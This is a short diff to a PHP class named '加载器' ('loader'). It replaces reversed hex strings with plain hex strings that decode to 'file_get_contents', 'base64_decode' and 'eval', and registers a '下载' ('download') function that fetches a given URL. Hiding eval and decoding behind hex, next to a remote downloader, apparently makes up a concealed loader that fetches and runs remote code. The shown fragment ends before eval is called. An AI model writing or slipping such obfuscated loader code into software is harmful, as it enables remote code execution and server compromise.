@@ -4,9 +4,9 @@ class 加载器 {
     
     public static function 准备() {
 
-        $获取 = strrev(hex2bin('73746e656d676f635f74656e675f656c6966'));
-        $解码 = strrev(hex2bin('65646f6365645f343665736162'));
-        $执行 = strrev(hex2bin('6c617665'));
+        $获取 = hex2bin('66696c655f6765745f636f6e74656e7473');
+        $解码 = hex2bin('6261736536345f6465636f6465');
+        $执行 = hex2bin('6576616c');
         
         self::$方法库 = [
             '下载' => function($链接) use ($获取) { return $获取($链接); },
